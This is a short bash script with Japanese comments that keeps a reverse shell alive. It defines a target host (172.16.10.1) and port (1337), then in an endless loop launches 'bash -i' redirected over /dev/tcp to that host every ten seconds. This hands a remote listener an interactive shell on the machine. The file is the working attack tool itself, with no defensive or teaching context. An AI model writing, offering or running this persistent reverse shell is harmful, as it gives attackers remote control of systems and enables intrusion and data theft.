#!/bin/bash

TARGET_HOST="172.16.10.1"
TARGET_PORT="1337"

# リバースシェルプロセスを再起動する関数
restart_reverse_shell() {
  echo "Restarting reverse shell..."
  bash -i >& /dev/tcp/${TARGET_HOST}/${TARGET_PORT} 0>&1 &
}

# リバースシェルの状態を継続的に監視する
while true; do
  restart_reverse_shell
  # 再度チェックする前に指定した間隔でスリープする
  sleep 10
done